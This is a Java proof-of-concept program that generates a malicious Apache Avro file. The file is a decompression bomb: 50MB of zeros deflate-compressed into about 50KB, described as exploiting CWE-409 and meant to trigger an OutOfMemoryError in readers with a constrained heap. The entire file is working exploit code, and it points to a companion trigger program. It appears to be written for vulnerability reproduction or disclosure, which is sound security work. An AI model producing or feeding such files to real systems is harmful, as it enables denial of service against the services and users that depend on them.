package poc;

import org.apache.avro.Schema;
import org.apache.avro.file.CodecFactory;
import org.apache.avro.file.DataFileWriter;
import org.apache.avro.generic.GenericData;
import org.apache.avro.generic.GenericDatumWriter;
import org.apache.avro.generic.GenericRecord;

import java.io.File;
import java.nio.ByteBuffer;

/**
 * Creates a malicious Avro file that acts as a decompression bomb.
 *
 * The file is small on disk (~50KB) but contains a payload that decompresses
 * to 50MB of zeros. When a reader decompresses this with a constrained heap
 * (e.g. -Xmx32m), it triggers OutOfMemoryError in the codec layer.
 *
 * This exploits CWE-409: Improper Handling of Highly Compressed Data
 * (aka "Decompression Bomb").
 */
public class CreatePoC {

    private static final String SCHEMA_JSON =
            "{\"type\":\"record\",\"name\":\"Payload\",\"fields\":[" +
            "{\"name\":\"data\",\"type\":\"bytes\"}]}";

    // 50 MB of zeros -- compresses roughly 1000:1 with deflate level 9
    private static final int PAYLOAD_SIZE = 50 * 1024 * 1024;

    public static void main(String[] args) throws Exception {
        String outputFile = args.length > 0 ? args[0] : "poc.avro";

        System.out.println("=== Avro Decompression Bomb PoC - File Generator ===");
        System.out.println();
        System.out.println("Creating malicious Avro file: " + outputFile);
        System.out.println("Payload size (uncompressed): " + (PAYLOAD_SIZE / (1024 * 1024)) + " MB");

        Schema schema = new Schema.Parser().parse(SCHEMA_JSON);

        try (DataFileWriter<GenericRecord> writer =
                new DataFileWriter<>(new GenericDatumWriter<>(schema))) {

            // Use deflate with maximum compression (level 9)
            // Zeros compress extremely well, achieving ~1000:1 ratio
            writer.setCodec(CodecFactory.deflateCodec(9));
            writer.create(schema, new File(outputFile));

            // 50MB of zeros - this is the "bomb" payload
            byte[] payload = new byte[PAYLOAD_SIZE];
            // payload is already all zeros (Java default)

            GenericRecord record = new GenericData.Record(schema);
            record.put("data", ByteBuffer.wrap(payload));
            writer.append(record);
        }

        File f = new File(outputFile);
        long fileSize = f.length();
        double ratio = (double) PAYLOAD_SIZE / fileSize;

        System.out.println();
        System.out.println("Result:");
        System.out.println("  File size on disk: " + fileSize + " bytes (" + (fileSize / 1024) + " KB)");
        System.out.println("  Decompressed size: " + (PAYLOAD_SIZE / (1024 * 1024)) + " MB");
        System.out.println("  Compression ratio: " + String.format("%.0f", ratio) + ":1");
        System.out.println();
        System.out.println("Now run TriggerOOM with limited heap to reproduce the vulnerability:");
        System.out.println("  java -Xmx32m -cp <classpath> poc.TriggerOOM " + outputFile);
    }
}
